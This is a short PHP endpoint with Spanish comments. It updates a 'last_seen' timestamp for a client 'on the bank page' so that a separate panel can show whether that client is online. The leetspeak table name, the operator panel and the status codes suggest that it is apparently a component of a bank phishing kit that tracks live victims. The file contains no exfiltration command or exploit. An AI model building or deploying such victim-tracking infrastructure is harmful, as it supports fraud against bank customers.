<?php
// Heartbeat del cliente en la página del banco — actualiza last_seen para el indicador online/offline

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200); exit;
}

// Acepta id por cookie, POST o GET
$id = 0;
if (!empty($_COOKIE['id']))        $id = (int)$_COOKIE['id'];
elseif (!empty($_POST['id']))      $id = (int)$_POST['id'];
elseif (!empty($_GET['id']))       $id = (int)$_GET['id'];

if ($id <= 0) {
    echo json_encode(['ok' => false, 'msg' => 'no id']);
    exit;
}

require_once __DIR__ . '/../panel/include/link.php';
$con = conectar();
if (!$con) {
    echo json_encode(['ok' => false, 'msg' => 'db err']);
    exit;
}

date_default_timezone_set('America/Bogota');
$ahora = date('Y-m-d H:i:s');

// Actualiza last_seen solo si el item existe y no está finalizado (status != 10)
$stmt = $con->prepare("UPDATE m3it3m SET last_seen = ? WHERE idreg = ? AND status NOT IN (10, 12)");
if ($stmt) {
    $stmt->bind_param('si', $ahora, $id);
    $stmt->execute();
    $afectado = $stmt->affected_rows;
    $stmt->close();
    desconectar($con);
    echo json_encode(['ok' => true, 'rows' => $afectado]);
} else {
    desconectar($con);
    echo json_encode(['ok' => false, 'msg' => 'stmt err']);
}
